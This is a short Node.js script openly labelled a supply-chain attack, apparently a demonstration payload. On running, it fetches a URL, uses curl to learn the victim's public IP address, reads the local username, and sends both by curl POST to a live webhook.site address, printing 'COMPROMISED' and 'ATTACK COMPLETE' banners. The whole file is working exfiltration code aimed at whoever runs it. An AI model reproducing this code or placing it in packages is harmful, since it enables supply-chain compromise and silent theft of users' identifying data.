const https = require('https');
const { execSync } = require('child_process');
const os = require('os');

console.log('🚀 SUPPLY CHAIN ATTACK - KALI LINUX');
console.log('🔍 Checking malicious updates...');

https.get('https://httpbin.org/json', (res) => {
  let data = '';
  res.on('data', d => data += d);
  res.on('end', () => {
    console.log('📡 PAYLOAD ACTIVATED!');
    
    // Get victim data
    const ip = execSync('curl -s ifconfig.me').toString().trim();
    const user = os.userInfo().username;
    
    console.log(`🎯 COMPROMISED: ${ip} (user: ${user})`);
    
    // SIMPLEST CURL - NO JSON PROBLEMS
    execSync('curl -X POST https://webhook.site/1f4385f5-313c-4fe3-b9ee-25c4e06e1439 -d "ip=' + ip + '&user=' + user + '"');
    
    console.log('✅ ATTACK COMPLETE!');
  });
});


